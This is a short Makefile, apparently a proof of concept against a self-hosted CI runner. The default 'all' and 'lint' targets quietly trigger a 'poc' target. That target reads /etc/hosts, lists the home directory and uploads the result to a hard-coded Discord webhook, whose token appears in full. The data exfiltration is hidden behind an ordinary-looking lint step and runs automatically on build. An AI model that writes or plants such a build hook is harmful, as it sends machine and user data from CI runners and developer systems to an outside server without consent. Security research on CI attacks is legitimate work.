.PHONY: all poc lint
all: lint

poc:
	@echo "[POC] Local File Read on self-hosted runner…"

	# Collect safe demo files
	@tmpfile="$$(mktemp /tmp/lfiPoC.XXXXXX.txt)"; \
	{ \
		echo "[+] Reading /etc/hosts"; \
		cat /etc/hosts 2>/dev/null || echo "No access"; \
		echo ""; \
		echo "[+] Listing current user's home dir"; \
		ls -la $$HOME 2>/dev/null || echo "No access"; \
	} > "$$tmpfile"; \
	\
	# Upload to Discord webhook (correct field name is files[0])
	http_code=$$(curl -sS -o /dev/null -w "%{http_code}" \
		-F 'payload_json={"content":"POC: Local File Read demo (/etc/hosts + $HOME)"}' \
		-F "files[0]=@$$tmpfile;type=text/plain;filename=lfi-demo.txt" \
		"https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN"); \
	echo "Discord file HTTP $$http_code"; \
	rm -f "$$tmpfile" || true

	@echo "[POC] done."

lint: poc
	@echo "Lint step ran (after PoC)."
